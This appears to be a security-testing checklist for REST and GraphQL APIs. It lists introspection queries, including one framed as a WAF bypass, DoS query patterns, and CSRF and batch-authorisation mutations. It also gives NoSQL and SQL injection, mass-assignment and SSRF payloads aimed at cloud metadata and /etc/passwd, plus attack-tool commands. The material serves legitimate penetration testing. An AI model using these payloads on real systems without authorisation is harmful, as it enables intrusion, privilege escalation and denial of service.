# REST + GraphQL in-depth testing

## Complete Checklist for GraphQL Security Testing

### Introspection detection (level three downgrade)

```graphql
# Level 1 — Standard Introspection
{ __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }

# Level 2 — Streamlined Introspection (Bypass WAF)
{ __schema { types { name } } }

# Level 3 — Minimum Detection
{ __type(name: "Query") { name } }
```

### DoS attack vectors

```graphql
# Alias Overload
query { a1: __typename a2: __typename ... a100: __typename }

# Batch Query Overload
[query1, query2, ..., query10]

# Loop Query
query { __schema { types { fields { type { fields { type { fields { name } } } } } } } }

# Instruction Overload
query { __typename @skip(if: false) @include(if: true) ... }
```

### Authorization test

```graphql
# GET Mutation (CSRF)
GET /graphql?query=mutation+{+deleteUser(id:1)+}

# Batch Query Bypasses Authentication
[
  { "query": "query { me { id } }" },
  { "query": "mutation { deleteUser(id: 2) }" }
]
```

## REST API in-depth testing

### Method to manipulate matrix

| Endpoint | GET | POST | PUT | PATCH | DELETE | OPTIONS |
|------|-----|------|-----|-------|--------|---------|
| /users | ✓ Accessible | Test unauthorized creation | Test batch coverage | Test field injection | Test cascade deletion | Information leakage |
| /users/me | Benchmark | — | Test self-elevation | Test field append | Test self-deletion | — |

### Parameter injection

```json
// NoSQL Injection
{"username": {"$gt": ""}, "password": {"$ne": ""}}

// Batch assignment
{"email": "user@example.com", "role": "admin", "isAdmin": true}

// Parameter pollution
GET /api/users?role=user&role=admin

// JSON array injection
{"ids": [1, 2, 3]} → {"ids": ["1 UNION SELECT ..."]}
```

### SSRF via API

```
Common SSRF parameters: webhook_url, callback_url, avatar_url, import_url,
                redirect_uri, file_url, proxy_url, image_url
Test: http://169.254.169.254/latest/meta-data/ (AWS)
      http://metadata.google.internal/ (GCP)
      file:///etc/passwd
```

## Automation tool chain

### Vespasian (traffic-driven specification generation)

```bash
# Scraping from a headless browser
vespasian crawl --url https://target.com --depth 3

# from Burp/HAR import
vespasian import --file traffic.har

# Export OpenAPI 3.0 + GraphQL SDL
vespasian export --format openapi3 --output api-spec.yaml
```

### Entropy (LLM attack generation)

```bash
# Automated Testing Based on Spec
entropy --spec api-spec.yaml --live --persona all

# Five Types of Concurrent Personalities:
# - malicious_insider: IDOR/mass assignment/privilege escalation
# - bot_swarm: Rate limit bypass/DoS/automation abuse
# - penetration_tester: Injection/Authentication Bypass
# - impatient_consumer: Race conditions/Error handling
# - confused_user: accidental input/boundary test

# CI Mode
entropy --spec api-spec.yaml --ci --watch
```

### api.sh (8-stage pipeline)

```bash
# Phase 1-3: GraphQL Reconnaissance → Exploitation → Brute Force
./api.sh graphql-recon https://target.com/graphql
./api.sh graphql-exploit https://target.com/graphql

# Phase 4: REST Abuse
./api.sh rest-abuse https://target.com/api

# Phase 5: WebSocket
./api.sh ws-test wss://target.com/ws

# Phase 6: SOAP/XXE
./api.sh soap-xxe https://target.com/soap

# Phase 7: Speed Limit Bypass
./api.sh rate-bypass https://target.com/api

# Phase 8: Schema Harvest
./api.sh schema-harvest https://target.com
```

Source: OWASP API Top 10, Praetorian Vespasian, Entropy, FireTail GraphQL
